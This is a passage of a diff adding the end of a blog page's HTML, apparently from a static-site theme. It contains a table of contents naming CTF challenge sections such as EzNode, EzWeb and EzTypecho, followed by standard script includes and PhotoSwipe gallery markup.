+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Check-in"><span class="toc-number">1.</span> <span class="toc-text">1.Check in</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF"><span class="toc-number">2.</span> <span class="toc-text">2.老八小超市儿</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-EzNode"><span class="toc-number">3.</span> <span class="toc-text">3.EzNode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-EzWeb"><span class="toc-number">4.</span> <span class="toc-text">4.EzWeb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho"><span class="toc-number">5.</span> <span class="toc-text">5.EZ三剑客-EzTypecho</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">总结：</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
